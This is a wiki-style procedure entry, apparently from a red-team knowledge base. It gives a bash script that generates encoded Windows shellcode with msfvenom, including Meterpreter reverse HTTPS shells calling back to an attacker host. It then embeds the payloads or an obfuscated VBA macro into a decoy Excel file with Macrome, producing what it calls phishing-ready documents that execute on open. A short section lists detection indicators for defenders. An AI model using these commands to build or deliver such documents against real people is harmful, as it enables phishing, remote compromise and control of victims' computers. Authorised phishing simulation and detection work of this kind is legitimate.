---
id: 87fc998a-8c0b-43c9-bff8-319964c3bc40
name: Macrome-Payload-Generation-and-Document-Build-Script
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:23.232508+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - payload-generation
  - macro-build
validated: true
---

# Macrome-Payload-Generation-and-Document-Build-Script

## Code

```bash
# NOTE: The payload cannot contains NULL bytes.

# Default calc
msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin
msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin
# Custom shellcode
msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\x00'
msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\x00'
# MSF shellcode
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00'  -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00' -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin

dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin
dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin

# For VBA Macro
Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop
```

## Description

This bash script generates x86/x64 shellcode payloads using msfvenom for calc.exe, custom inputs, and Metasploit reverse HTTPS shells, then builds malicious Excel documents with Macrome by embedding the payloads into a decoy .xls file. It supports both shellcode and VBA macro modes. Run on a Linux host with Metasploit and .NET/Macrome installed to produce phishing-ready files.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| LHOST | Attacker IP for reverse shells | 192.168.1.59 |
| LPORT | Listener port | 443 |
| payload86.bin / payload64.bin | Custom input payload files | Generated from exploits |
| decoy_document.xls | Legitimate Excel decoy file | sample_report.xls |
| macro_example.txt | VBA macro source file | malicious_vba.txt |
| VelvetSweatshop | Password for document | Custom string |

## Usage

Save as a .sh file, make executable (chmod +x), and run `./script.sh`. Ensure a decoy .xls and any custom payloads exist. For reverse shells, start msfconsole handler first. Used in phishing simulations to create macro-enabled documents that execute on open.

## Detection

- EDR monitoring for msfvenom processes or unusual .NET executions (dotnet Macrome.dll).
- Office macro scanning in AV (look for XLM macros or embedded shellcode).
- Network logs for HTTPS callbacks to internal IPs on port 443 from Excel.
- File entropy analysis on .xls attachments (high entropy indicates embedding).

## Related

- [[procedures/Create-Malicious-Macro-Enabled-Excel-Documents-with-Macrome]]
- [[tools/macrome]]
- [[tools/msfvenom]]
